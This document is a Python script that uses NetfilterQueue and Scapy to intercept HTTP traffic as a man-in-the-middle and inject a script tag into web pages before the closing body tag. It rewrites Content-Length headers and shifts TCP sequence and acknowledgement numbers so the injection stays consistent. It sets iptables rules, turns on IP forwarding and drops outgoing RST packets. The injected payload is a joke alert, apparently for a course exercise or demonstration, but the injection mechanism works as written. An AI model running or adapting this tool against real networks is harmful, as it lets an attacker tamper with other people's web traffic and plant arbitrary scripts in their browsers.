from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import traceback
import string
import time
from logger import getLogger

logger = getLogger(__name__)

PROTO_TCP = 6
PORT_WWW_HTTP = 80
TCP_FIN = 0x01
TCP_SYN = 0x02
TCP_PSH = 0x08
TCP_ACK = 0x10

ENABLE = True

SCRIPT = b'<script>alert("PHP is the best language!");</script>'
SCRIPT_LEN = len(SCRIPT)

sessions = {}
conf.L3socket = L3RawSocket

def is_http_request(s):
    return s[:3] == b'GET' and s.find(b'Accept: ') != -1

def get_session(ip, port):
    S = (ip, port)
    if S in sessions:
        sess = sessions[S]
        # logger.info("recorded time = %s, current = %s", sess['time'], time.perf_counter())
        if sess['time'] < time.perf_counter() - 5:
            del sessions[S]
            logger.warning('invalidate session: %s', S)
            return None
        return sess
    return None

def add_session(ip, port):
    S = (ip, port)
    logger.warning('new session')
    sess = {'offset': 0, 'FIN_count': 0, 'threshold': 10**10, 'seq_': 0, 'ack_': 0, 'monitored': False, 'time': time.perf_counter()}
    sessions[S] = sess

def callback(pkt):
    modified = False
    try:
        data = IP(pkt.get_payload())
        if data.proto == PROTO_TCP and data.sport == PORT_WWW_HTTP: # incoming
            # data.show()
            sess = get_session(data.src, data.dport)
            if sess != None and data[TCP].flags == TCP_SYN | TCP_ACK:
                sess['seq_'] = data[TCP].seq
                sess['ack_'] = data[TCP].ack

            if sess != None :

                logger.info("summary = %s, seq = %s, ack = %s, thres = %s", data.summary(), data.seq - sess['seq_'], data.ack - sess['ack_'], sess['threshold'] - sess['seq_'])
                if data[TCP].seq >= sess['threshold']:
                    if ENABLE:
                        data[TCP].seq += sess['offset']
                    logger.info(f'modify seq, delta = {sess["offset"]}, modified results = ({data[TCP].seq - sess["seq_"]}, {data[TCP].ack - sess["ack_"]})')
                    modified = True

                raw = bytes(data[TCP].payload)
                # logger.info("raw = %s", raw)
                loc = raw.find(b'</body>')
                if raw:
                    logger.info('original data size = %s', len(raw))
                if loc != -1 and sess['monitored']: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".

                    # find the enclosing </body>
                    # should insert script before </body>
                    raw = raw[:loc] + SCRIPT + raw[loc:]
                    sess['offset'] = SCRIPT_LEN
                    sess['threshold'] = data[TCP].seq + sess['offset']

                    logger.warning('forging fake packet')
                    if ENABLE:
                        data[TCP].payload = raw
                    modified = True

                elif raw.find(b'Content-Length:') != -1 and sess['monitored']:
                    loc = raw.find(b'Content-Length:')
                    start = loc + 16
                    end = start
                    length = 0
                    while end < len(raw) and 48 <= raw[end] <= 57:
                        length = length * 10 + raw[end] - 48
                        end += 1
                    logger.info('length = %s', length)
                    length = bytes(str(length + SCRIPT_LEN), 'utf-8')
                    if ENABLE:
                        data[TCP].payload = raw[:start] + length + raw[end:]
                    modified = True
                    logger.warning('modified HTTP header')

                if data[TCP].flags & TCP_FIN:
                    sess['FIN_count'] += 1

        elif data.proto == PROTO_TCP and data.dport == PORT_WWW_HTTP: # outgoing, client -> server
            if data[TCP].flags == TCP_SYN:
               add_session(data.dst, data.sport)
            sess = get_session(data.dst, data.sport)
            if sess != None and data[TCP].flags == TCP_ACK | TCP_PSH and is_http_request(bytes(data[TCP].payload)):
               sess['monitored'] = True
            if sess != None:
                logger.info("summary = %s, seq = %s, ack = %s", data.summary(), data.seq - sess['ack_'], data.ack - sess['seq_'])
            if sess != None:
                if data[TCP].ack >= sess['threshold'] + len(data[TCP].payload):
                    if ENABLE:
                        data[TCP].ack -= sess['offset']
                    logger.info(f'modify ack, delta = {-sess["offset"]}, modified results = ({data[TCP].seq- sess["ack_"]}, {data[TCP].ack - sess["seq_"]})')
                    modified = True
            
    except:
        logger.info('error')
        traceback.print_exc()
    
    if modified and ENABLE:
        del data[TCP].chksum
        del data.len
        del data[IP].chksum
        pkt.set_payload(bytes(data))
    pkt.accept()

def callback2(pkt):
    pkt.accept()

def main():
    Qnum = 1
    rules = [
        f'iptables -I INPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I OUTPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I FORWARD -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP',
    ]
    for rule in rules:
        logger.info(f'setting rule: {rule}')
        os.system(rule)

    os.system("sysctl net.ipv4.ip_forward=1")

    q = NetfilterQueue()
    q.bind(Qnum, callback)
    try:
        q.run()
    except KeyboardInterrupt:
        pass
    q.unbind()
    os.system('iptables -F')
    os.system('iptables -X')

if __name__ == "__main__":
    main()
